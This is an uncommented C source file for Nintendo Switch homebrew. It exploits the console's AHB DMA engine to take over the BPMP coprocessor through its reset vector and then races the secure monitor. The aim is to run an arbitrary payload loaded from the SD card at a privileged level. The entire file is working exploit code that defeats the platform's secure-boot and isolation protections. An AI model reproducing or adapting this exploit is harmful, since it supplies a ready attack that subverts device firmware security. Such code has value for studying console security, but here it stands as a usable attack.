#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <errno.h>

#include <sys/stat.h>
#include <sys/types.h>

#include <switch.h>

#include "defines.h"
#include "sc7fw_bin.h"
#include "rebootstub_bin.h"

#define MODULE_CAFF       207
#define PAYLOAD_BUF_SIZE  0x20000

static const char *g_payload_path = "sdmc:/atmosphere/reboot_payload.bin";

static uintptr_t g_iram_base;
static uintptr_t g_clk_rst_base;
static uintptr_t g_flow_ctlr_base;
static uintptr_t g_ahbdma_base;
static uintptr_t g_ahbdmachan_base;

uint32_t __nx_applet_type = AppletType_LibraryApplet;

void __libnx_initheap(void) {
  static char fake_heap[0x40000];

  extern const void *fake_heap_start;
  extern const void *fake_heap_end;

  fake_heap_start = &fake_heap[0];
  fake_heap_end   = &fake_heap[sizeof fake_heap];
}

void __appInit(void) {
  Result rc;

  rc = smInitialize();
  if (R_FAILED(rc)) {
    fatalSimple(MAKERESULT(Module_Libnx, LibnxError_InitFail_SM));
  }

  rc = setsysInitialize();
  if (R_SUCCEEDED(rc)) {
    SetSysFirmwareVersion fw;

    rc = setsysGetFirmwareVersion(&fw);
    if (R_SUCCEEDED(rc)) {
      hosversionSet(MAKEHOSVERSION(fw.major, fw.minor, fw.micro));
    }
    setsysExit();
  }

  rc = appletInitialize();
  if (R_FAILED(rc)) {
    fatalSimple(MAKERESULT(Module_Libnx, LibnxError_InitFail_AM));
  }

  rc = bpcInitialize();
  if (R_FAILED(rc)) {
    fatalSimple(MAKERESULT(MODULE_CAFF, __LINE__));
  }

  rc = fsInitialize();
  if (R_FAILED(rc)) {
    fatalSimple(MAKERESULT(Module_Libnx, LibnxError_InitFail_FS));
  }

  rc = fsdevMountSdmc();
  if (R_FAILED(rc)) {
    fatalSimple(MAKERESULT(Module_Libnx, LibnxError_InitFail_FS));
  }
}

void __appExit(void) {
  fsdevUnmountAll();
  fsExit();
  bpcExit();
  appletExit();
  smExit();
}

static inline void query_io_mappings(void) {
  Result rc;

  rc = svcQueryIoMapping(&g_iram_base, IRAM_BASE, 0x40000);
  if (R_FAILED(rc)) {
    fatalSimple(MAKERESULT(MODULE_CAFF, __LINE__));
  }

  rc = svcQueryIoMapping(&g_clk_rst_base, CLK_RST_BASE, 0x1000);
  if (R_FAILED(rc)) {
    fatalSimple(MAKERESULT(MODULE_CAFF, __LINE__));
  }

  rc = svcQueryIoMapping(&g_flow_ctlr_base, FLOW_CTLR_BASE, 0x1000);
  if (R_FAILED(rc)) {
    fatalSimple(MAKERESULT(MODULE_CAFF, __LINE__));
  }

  rc = svcQueryIoMapping(&g_ahbdma_base, AHBDMA_BASE, 0x1000);
  if (R_FAILED(rc)) {
    fatalSimple(MAKERESULT(MODULE_CAFF, __LINE__));
  }

  rc = svcQueryIoMapping(&g_ahbdmachan_base, AHBDMACHAN_BASE, 0x1000);
  if (R_FAILED(rc)) {
    fatalSimple(MAKERESULT(MODULE_CAFF, __LINE__));
  }
}

static void ahbdma_init_hw(void) {
  CLK_RST_CONTROLLER_RST_DEV_H_SET_0 = BIT(1);
  CLK_RST_CONTROLLER_CLK_ENB_H_SET_0 = BIT(1);

  svcSleepThread(1000000ull);

  CLK_RST_CONTROLLER_RST_DEV_H_CLR_0 = BIT(1);

  AHBDMA_CMD_0 = BIT(31);
}

static UNUSED void ahbdma_deinit_hw(void) {
  AHBDMA_CMD_0 &= ~BIT(31);

  CLK_RST_CONTROLLER_RST_DEV_H_SET_0 = BIT(1);
  CLK_RST_CONTROLLER_CLK_ENB_H_CLR_0 = BIT(1);
}

static void ahbdma_write_reg32(uint32_t phys, uint32_t data) {
  IRAM(0x3FFDC) = data;

  AHBDMACHAN_CHANNEL_0_AHB_SEQ_0 = (2u << 24);

  AHBDMACHAN_CHANNEL_0_AHB_PTR_0 = 0x4003FFDC;
  AHBDMACHAN_CHANNEL_0_XMB_PTR_0 = 0x80000100;

  AHBDMACHAN_CHANNEL_0_CSR_0 = BIT(31) | BIT(27) | BIT(26);

  while (AHBDMACHAN_CHANNEL_0_STA_0 & BIT(31)) {
  }

  AHBDMACHAN_CHANNEL_0_AHB_PTR_0 = phys;
  AHBDMACHAN_CHANNEL_0_XMB_PTR_0 = 0x80000100;

  AHBDMACHAN_CHANNEL_0_CSR_0 = BIT(31) | BIT(26);

  while (AHBDMACHAN_CHANNEL_0_STA_0 & BIT(31)) {
  }
}

static UNUSED uint32_t ahbdma_read_reg32(uint32_t phys) {
  IRAM(0x3FFDC) = 0xCAFEBABE;

  AHBDMACHAN_CHANNEL_0_AHB_SEQ_0 = (2u << 24);

  AHBDMACHAN_CHANNEL_0_AHB_PTR_0 = phys;
  AHBDMACHAN_CHANNEL_0_XMB_PTR_0 = 0x80000100;

  AHBDMACHAN_CHANNEL_0_CSR_0 = BIT(31) | BIT(27) | BIT(26);

  while (AHBDMACHAN_CHANNEL_0_STA_0 & BIT(31)) {
  }

  AHBDMACHAN_CHANNEL_0_AHB_PTR_0 = 0x4003FFDC;
  AHBDMACHAN_CHANNEL_0_XMB_PTR_0 = 0x80000100;

  AHBDMACHAN_CHANNEL_0_CSR_0 = BIT(31) | BIT(26);

  while (AHBDMACHAN_CHANNEL_0_STA_0 & BIT(31)) {
  }

  return IRAM(0x3FFDC);
}

static void ahbdma_race_secmon(uint32_t entry) {
  IRAM(0x3FFE0) = entry;
  IRAM(0x3FFE4) = entry;
  IRAM(0x3FFE8) = entry;
  IRAM(0x3FFEC) = entry;
  IRAM(0x3FFF0) = entry;
  IRAM(0x3FFF4) = entry;
  IRAM(0x3FFF8) = entry;
  IRAM(0x3FFFC) = entry;

  AHBDMACHAN_CHANNEL_2_AHB_PTR_0 = 0x4003FFE0;
  AHBDMACHAN_CHANNEL_2_AHB_SEQ_0 = (2u << 24);
  AHBDMACHAN_CHANNEL_2_XMB_PTR_0 = 0x80002000;

  AHBDMACHAN_CHANNEL_2_CSR_0 = BIT(31) | BIT(27) | (7u << 2);

  AHBDMACHAN_CHANNEL_3_AHB_PTR_0 = BPMP_VECTOR_RESET;
  AHBDMACHAN_CHANNEL_3_AHB_SEQ_0 = (2u << 24);
  AHBDMACHAN_CHANNEL_3_XMB_PTR_0 = 0x80002000;

  AHBDMACHAN_CHANNEL_3_CSR_0 = BIT(31) | BIT(25) | (10u << 20) | (7u << 2);
}

static void execute_on_bpmp(uint32_t entry) {
  ahbdma_write_reg32(BPMP_VECTOR_RESET, entry);

  CLK_RST_CONTROLLER_RST_DEV_L_SET_0 = BIT(1);
  svcSleepThread(2000ull);
  CLK_RST_CONTROLLER_RST_DEV_L_CLR_0 = BIT(1);

  FLOW_CTLR_HALT_COP_EVENTS_0 = 0;

  while ((FLOW_CTLR_HALT_COP_EVENTS_0 >> 29) != 2) {
    svcSleepThread(1000ull);
  }
}


int main(void) {
  Result rc;

  query_io_mappings();
  ahbdma_init_hw();

  FILE *f;
  if (!(f = fopen(g_payload_path, "rb"))) {
    fatalSimple(MAKERESULT(MODULE_CAFF, __LINE__));
  }

  struct stat st;
  if ((stat(g_payload_path, &st) != 0) || !S_ISREG(st.st_mode)) {
    fatalSimple(MAKERESULT(MODULE_CAFF, __LINE__));
  }

  if (!st.st_size || ((uint64_t)st.st_size > PAYLOAD_BUF_SIZE)) {
    fatalSimple(MAKERESULT(MODULE_CAFF, __LINE__));
  }

  uint8_t *payload = aligned_alloc(0x1000, PAYLOAD_BUF_SIZE);
  if (!payload) {
    fatalSimple(MAKERESULT(MODULE_CAFF, errno));
  }

  if (fread(payload, 1, st.st_size, f) != (size_t)st.st_size) {
    fatalSimple(MAKERESULT(MODULE_CAFF, __LINE__));
  }

  fclose(f);

  armDCacheFlush(payload, PAYLOAD_BUF_SIZE);

  rc = svcSetMemoryAttribute(payload, PAYLOAD_BUF_SIZE, 8, 8);
  if (R_FAILED(rc)) {
    fatalSimple(MAKERESULT(MODULE_CAFF, __LINE__));
  }

  struct {
    uintptr_t phys_base;
    uintptr_t virt_base;
    uintptr_t size;
  } out;

  rc = svcQueryPhysicalAddress((uint64_t *)&out, (uintptr_t)payload);
  if (R_FAILED(rc)) {
    fatalSimple(MAKERESULT(MODULE_CAFF, __LINE__));
  }

  uintptr_t phys = out.phys_base + ((uintptr_t)payload - out.virt_base);
  if (phys > (0x100000000ull - st.st_size)) {
    fatalSimple(MAKERESULT(MODULE_CAFF, __LINE__));
  }

  COPY_TO_IRAM(0x3D000, sc7fw_bin, sc7fw_bin_size);
  COPY_TO_IRAM(0x3F000, rebootstub_bin, rebootstub_bin_size);

  volatile struct _params {
    uint32_t phys;
    uint32_t size;
  } *params = (volatile struct _params *)(g_iram_base + 0x3DFF8);

  params->phys = (uint32_t)phys;
  params->size = (uint32_t)st.st_size;

  execute_on_bpmp(0x4003D008);

  BpcSleepButtonState state;
  while (true) {
    rc = bpcGetSleepButtonState(&state);
    if (R_SUCCEEDED(rc) && (state == BpcSleepButtonState_Held)) {
      break;
    }
    svcSleepThread(100000000ull);
  }

  ahbdma_race_secmon(0x4003D000);

  for (;;) {
  }
}

